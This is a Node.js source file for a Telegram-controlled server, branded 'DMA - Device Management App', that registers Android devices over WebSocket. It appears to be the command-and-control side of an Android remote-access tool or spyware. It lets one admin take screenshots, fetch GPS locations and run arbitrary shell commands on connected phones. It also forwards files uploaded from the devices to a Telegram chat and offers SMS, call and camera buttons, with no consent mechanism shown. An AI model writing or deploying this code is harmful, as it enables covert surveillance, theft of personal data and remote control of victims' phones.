require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const CryptoJS = require('crypto-js');
const helmet = require('helmet');

// Configuration
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const secretKey = process.env.SECRET_KEY;
const encryptionKey = process.env.ENCRYPTION_KEY;

// Security check
if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
    console.error('❌ SECURITY ALERT: Using compromised token! Regenerate via @BotFather');
    process.exit(1);
}

// PID file to prevent multiple instances
const PID_FILE = path.join(__dirname, 'bot.pid');
try {
    if (fs.existsSync(PID_FILE)) {
        const oldPid = fs.readFileSync(PID_FILE, 'utf8');
        try {
            process.kill(parseInt(oldPid), 0);
            console.error('❌ Another bot instance is already running with PID:', oldPid);
            process.exit(1);
        } catch (e) {
            console.log('🗑️ Removing stale PID file...');
            fs.unlinkSync(PID_FILE);
        }
    }
    fs.writeFileSync(PID_FILE, process.pid.toString());
    console.log('📝 PID file created:', process.pid);
} catch (err) {
    console.error('PID file error:', err.message);
}

// Cleanup PID on exit
process.on('exit', () => {
    try {
        if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
    } catch (err) {}
});
process.on('SIGINT', () => process.exit());
process.on('SIGTERM', () => process.exit());

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

// Initialize bot WITHOUT polling first
const bot = new TelegramBot(token);

// Safe Telegram message sender - FIXES MARKDOWN ERRORS
async function safeSendMessage(chatId, text, options = {}) {
    if (!text) return;
    
    // If no parse mode, send as-is
    if (!options.parse_mode) {
        try {
            return await bot.sendMessage(chatId, text, options);
        } catch (error) {
            console.error('Send message error:', error.message);
            return null;
        }
    }

    // Escape function for MarkdownV2
    const escapeMarkdownV2 = (str) => {
        if (!str) return str;
        // Must escape: _ * [ ] ( ) ~ ` > # + - = | { } . !
        return str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
    };

    // Escape function for legacy Markdown
    const escapeMarkdown = (str) => {
        if (!str) return str;
        return str.replace(/([_*[\]()])/g, '\\$1');
    };

    let processedText = text;
    if (options.parse_mode === 'MarkdownV2') {
        processedText = escapeMarkdownV2(text);
    } else if (options.parse_mode === 'Markdown') {
        processedText = escapeMarkdown(text);
    }

    // Try with escaped text
    try {
        return await bot.sendMessage(chatId, processedText, options);
    } catch (error) {
        if (error.message.includes('can\'t parse entities')) {
            console.warn('⚠️ Markdown parsing failed, sending without formatting');
            const { parse_mode, ...plainOptions } = options;
            // Remove markdown characters
            const plainText = text.replace(/[*_`[\]()#]/g, '');
            try {
                return await bot.sendMessage(chatId, plainText, plainOptions);
            } catch (fallbackError) {
                console.error('❌ Even plain text failed:', fallbackError.message);
                return null;
            }
        }
        console.error('❌ Send message error:', error.message);
        return null;
    }
}

// Webhook setup - FIXES 409 CONFLICT
async function setupWebhook() {
    try {
        const serverUrl = process.env.SERVER_URL;
        if (!serverUrl) {
            console.warn('⚠️ SERVER_URL not set, using polling mode with safety checks');
            await bot.stopPolling();
            await bot.startPolling();
            console.log('✅ Bot started in polling mode');
            return;
        }

        const webhookUrl = `${serverUrl}/webhook/${token}`;
        
        // Delete any existing webhook and drop pending updates
        await bot.deleteWebHook();
        
        // Set new webhook
        await bot.setWebHook(webhookUrl, {
            allowed_updates: ['message', 'callback_query', 'inline_query']
        });
        
        const webhookInfo = await bot.getWebHookInfo();
        console.log('✅ Webhook set successfully');
        console.log('🌐 Webhook URL:', webhookInfo.url);
        console.log('📊 Pending updates:', webhookInfo.pending_update_count);
        console.log('⏱️  Max connections:', webhookInfo.max_connections);
        
    } catch (error) {
        console.error('❌ Webhook setup failed:', error.message);
        console.log('⚠️ Falling back to polling mode...');
        try {
            await bot.stopPolling();
            await bot.startPolling();
            console.log('✅ Bot started in polling mode');
        } catch (pollingError) {
            console.error('❌ Polling also failed:', pollingError.message);
            process.exit(1);
        }
    }
}

// Webhook endpoint
app.post(`/webhook/${token}`, express.json(), (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook processing error:', error);
        res.sendStatus(200); // Still return 200 to prevent retries
    }
});

// Security middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(express.json({ limit: '10mb' }));

// Data structures
const connectedDevices = new Map();
const pendingCommands = new Map();
const userSessions = new Map();

// Create necessary directories
['uploads', 'logs', 'screenshots'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        const dir = `uploads/${type}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const ext = path.extname(file.originalname);
        const name = path.basename(file.originalname, ext);
        const safeName = `${deviceId}-${Date.now()}-${name}${ext}`.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, safeName);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowed = /\.(jpg|jpeg|png|gif|mp4|avi|mov|mp3|wav|txt|pdf|apk)$/i;
        if (allowed.test(file.originalname)) {
            cb(null, true);
        } else {
            cb(new Error('File type not allowed'), false);
        }
    }
});

// Logging function
function logEvent(event, deviceId = 'system', details = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
    try {
        fs.appendFileSync('logs/server.log', logEntry);
    } catch (err) {
        console.error('Log write error:', err.message);
    }
    console.log(logEntry.trim());
}

// Setup Bot Commands
async function setupBotCommands() {
    const commands = [
        { command: 'start', description: 'Start the DMA bot' },
        { command: 'list', description: 'List connected devices' },
        { command: 'info', description: 'Get device info' },
        { command: 'cmd', description: 'Execute command on device' },
        { command: 'screen', description: 'Take screenshot' },
        { command: 'location', description: 'Get location' },
        { command: 'help', description: 'Show help message' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log('✅ Bot commands set up successfully');
    } catch (error) {
        console.error('❌ Failed to set commands:', error.message);
    }
}

// Interactive keyboards
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 List Devices' }, { text: 'ℹ️ Device Info' }],
            [{ text: '📸 Screenshot' }, { text: '📍 Location' }],
            [{ text: '📁 Files' }, { text: '📞 Call' }],
            [{ text: '💬 SMS' }, { text: '📷 Camera' }],
            [{ text: '❓ Help' }]
        ],
        resize_keyboard: true
    }
};

const removeKeyboard = {
    reply_markup: {
        remove_keyboard: true
    }
};

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    try {
        const deviceId = req.headers['device-id'];
        const deviceModel = req.headers['device-model'] || 'Unknown';
        const androidVersion = req.headers['android-version'] || 'Unknown';
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        if (!deviceId) {
            ws.close(1008, 'Missing device ID');
            return;
        }

        const deviceInfo = {
            id: deviceId,
            model: deviceModel,
            androidVersion,
            ip,
            connectedAt: new Date().toISOString(),
            lastSeen: Date.now()
        };

        ws.deviceId = deviceId;
        connectedDevices.set(deviceId, { ws, deviceInfo, lastSeen: Date.now() });

        // Send welcome message to Telegram - SAFE SEND
        const message = `📱 New Device Connected
• Device: ${deviceModel}
• Android: ${androidVersion}
• ID: ${deviceId}
• IP: ${ip}
• Time: ${new Date().toLocaleString()}`;

        safeSendMessage(adminId, message);
        logEvent('DEVICE_CONNECTED', deviceId, `${deviceModel} (${androidVersion})`);

        // Handle incoming messages
        ws.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                handleDeviceMessage(deviceId, message);
            } catch (error) {
                console.error('Message parse error:', error);
            }
            const device = connectedDevices.get(deviceId);
            if (device) device.lastSeen = Date.now();
        });

        // Handle disconnection
        ws.on('close', () => {
            connectedDevices.delete(deviceId);
            safeSendMessage(adminId, `📴 Device disconnected: ${deviceId}`);
            logEvent('DEVICE_DISCONNECTED', deviceId);
        });

        // Send initial command to get device info
        ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command: 'get_device_info',
            timestamp: Date.now()
        }));

    } catch (error) {
        console.error('Connection error:', error);
        ws.close(1011, 'Server error');
    }
});

// Handle device messages
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'response':
            handleCommandResponse(deviceId, message);
            break;
        case 'file_upload':
            handleFileUpload(deviceId, message);
            break;
        case 'device_info':
            updateDeviceInfo(deviceId, message.data);
            break;
        case 'error':
            safeSendMessage(adminId, `❌ Error from ${deviceId}:\n${message.error}`);
            break;
        default:
            console.log('Unknown message type:', message.type);
    }
}

// Update device information
function updateDeviceInfo(deviceId, info) {
    const device = connectedDevices.get(deviceId);
    if (device) {
        device.deviceInfo = { ...device.deviceInfo, ...info };
        safeSendMessage(adminId, `📊 Device Info Update:\n${JSON.stringify(info, null, 2)}`);
    }
}

// Handle command responses
function handleCommandResponse(deviceId, response) {
    if (response.success) {
        if (response.data) {
            const dataStr = typeof response.data === 'string' 
                ? response.data 
                : JSON.stringify(response.data, null, 2);
            safeSendMessage(adminId, `✅ Command executed on ${deviceId}\nResult: ${dataStr.substring(0, 1000)}${dataStr.length > 1000 ? '...' : ''}`);
        }
    } else {
        safeSendMessage(adminId, `❌ Command failed on ${deviceId}\nError: ${response.error || 'Unknown error'}`);
    }
}

// Handle file upload notifications
function handleFileUpload(deviceId, message) {
    safeSendMessage(adminId, `📁 File uploaded from ${deviceId}\nType: ${message.fileType || 'unknown'}\nPath: ${message.filePath || 'unknown'}`);
}

// Send command to device
function sendCommandToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (!device) {
        return false;
    }
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        return true;
    } catch (error) {
        console.error('Send command error:', error);
        return false;
    }
}

// Telegram Bot Handlers
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== adminId) {
        safeSendMessage(chatId, '⛔ Unauthorized access');
        return;
    }
    
    await setupBotCommands();
    
    const welcome = `🤖 DMA - Device Management App

Welcome to the Device Management System!

Available Commands:
/list - Show connected devices
/screen [device_id] - Take screenshot
/location [device_id] - Get location
/cmd [device_id] [command] - Execute command
/help - Show help

Quick Start:
1. Check connected devices with /list
2. Copy device ID from list
3. Use commands with device ID`;
    
    safeSendMessage(chatId, welcome, mainKeyboard);
});

bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    if (connectedDevices.size === 0) {
        safeSendMessage(chatId, '📭 No devices connected', removeKeyboard);
        return;
    }
    
    let response = `📱 Connected Devices (${connectedDevices.size}):\n\n`;
    connectedDevices.forEach((device, id) => {
        const uptime = Math.floor((Date.now() - device.lastSeen) / 60000);
        response += `• ${device.deviceInfo.model || 'Unknown'}\n`;
        response += `  ID: ${id}\n`;
        response += `  Android: ${device.deviceInfo.androidVersion || 'Unknown'}\n`;
        response += `  Active: ${uptime} mins ago\n\n`;
    });
    
    safeSendMessage(chatId, response);
});

bot.onText(/\/screen (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'take_screenshot');
        safeSendMessage(chatId, `📸 Screenshot command sent to ${deviceId.substring(0, 8)}...`);
    } else {
        safeSendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/location (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'get_location');
        safeSendMessage(chatId, `📍 Getting location from ${deviceId.substring(0, 8)}...`);
    } else {
        safeSendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/cmd (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const command = match[2];
    
    const device = connectedDevices.get(deviceId);
    if (device) {
        sendCommandToDevice(deviceId, 'execute', { cmd: command });
        safeSendMessage(chatId, `⚡ Executing command on ${deviceId.substring(0, 8)}...\n${command}`);
    } else {
        safeSendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const helpText = `🤖 DMA Help Guide

Commands:
/list - Show all connected devices
/screen [device_id] - Take screenshot
/location [device_id] - Get GPS location
/cmd [device_id] [command] - Execute shell command

Examples:
/list
/screen device123
/location device123
/cmd device123 ls -la

Interactive Buttons:
• Use the keyboard for quick actions
• Select devices when prompted`;
    
    safeSendMessage(chatId, helpText, mainKeyboard);
});

// Button handlers
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== adminId || !text) return;
    
    switch (text) {
        case '📱 List Devices':
            bot.emit('text:/list', msg);
            break;
            
        case '📸 Screenshot':
            if (connectedDevices.size === 0) {
                safeSendMessage(chatId, '❌ No devices connected');
                return;
            }
            let deviceList = 'Select device ID:\n';
            connectedDevices.forEach((device, id) => {
                deviceList += `\`${id}\` - ${device.deviceInfo.model || 'Unknown'}\n`;
            });
            safeSendMessage(chatId, `${deviceList}\nUse: /screen [device_id]`);
            break;
            
        case '📍 Location':
            if (connectedDevices.size === 0) {
                safeSendMessage(chatId, '❌ No devices connected');
                return;
            }
            let locList = 'Select device ID:\n';
            connectedDevices.forEach((device, id) => {
                locList += `\`${id}\` - ${device.deviceInfo.model || 'Unknown'}\n`;
            });
            safeSendMessage(chatId, `${locList}\nUse: /location [device_id]`);
            break;
            
        case '❓ Help':
            bot.emit('text:/help', msg);
            break;
    }
});

// HTTP endpoints
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing device ID or file' });
        }
        
        const caption = `📁 File from ${deviceId}\nSize: ${(req.file.size / 1024 / 1024).toFixed(2)}MB`;
        
        // Send file to Telegram
        await bot.sendDocument(adminId, req.file.path, { caption });
        
        // Clean up after sending
        setTimeout(() => {
            try {
                if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
            } catch (err) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: 'Upload failed' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        connectedDevices: connectedDevices.size,
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Cleanup old sessions
setInterval(() => {
    const now = Date.now();
    userSessions.forEach((session, userId) => {
        if (now - (session.timestamp || 0) > 15 * 60 * 1000) {
            userSessions.delete(userId);
        }
    });
}, 5 * 60 * 1000);

// Cleanup old files
setInterval(() => {
    const now = Date.now();
    const maxAge = 24 * 60 * 60 * 1000;
    
    ['uploads', 'screenshots'].forEach(dir => {
        if (!fs.existsSync(dir)) return;
        fs.readdirSync(dir).forEach(file => {
            const filePath = path.join(dir, file);
            try {
                const stats = fs.statSync(filePath);
                if (now - stats.mtimeMs > maxAge) {
                    fs.unlinkSync(filePath);
                }
            } catch (error) {}
        });
    });
}, 60 * 60 * 1000);

// Start server
const PORT = process.env.PORT || 8999;
server.listen(PORT, async () => {
    console.log(`🚀 DMA Server running on port ${PORT}`);
    console.log(`🤖 Bot: @Device1deep_bot`);
    
    // Setup webhook or polling
    await setupWebhook();
    await setupBotCommands();
    
    logEvent('SERVER_STARTED', 'system', `Port: ${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received. Shutting down gracefully...');
    wss.close(() => {
        server.close(() => {
            try {
                if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
            } catch (err) {}
            process.exit(0);
        });
    });
});
